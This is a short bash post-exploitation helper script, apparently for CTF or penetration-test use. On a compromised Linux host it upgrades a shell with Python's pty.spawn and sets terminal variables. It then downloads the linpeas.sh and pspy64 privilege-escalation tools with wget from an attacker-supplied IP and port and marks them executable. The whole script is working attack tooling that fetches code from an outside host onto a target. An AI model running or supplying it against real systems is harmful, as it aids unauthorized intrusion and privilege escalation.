#!/bin/bash

IP=$1
PORT=$2

regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
regex2='^[0-9]{1,4}$'

if [[ $IP =~ $regex ]] && [[ $PORT =~ $regex2 ]]; then
    echo "Valid IP and Port. Proceeding..."
    echo "Stabilizing the shell"

    python3 -c 'import pty;pty.spawn("/bin/bash")' </dev/null &>/dev/null &

    export TERM=xterm
    export SHELL=bash
    stty rows 26 columns 120

    wget "http://$IP:$PORT/linpeas.sh" -O linpeas.sh
    chmod +x linpeas.sh

    wget "http://$IP:$PORT/pspy64" -O pspy64
    chmod +x pspy64

    echo "Ctrl+Z to suspend the shell. Then run: stty raw -echo; fg"
else
    echo -e "WRONG FORMAT\nUsage: ./linprivsetup.sh <IP> <Port>"
    exit 1
fi






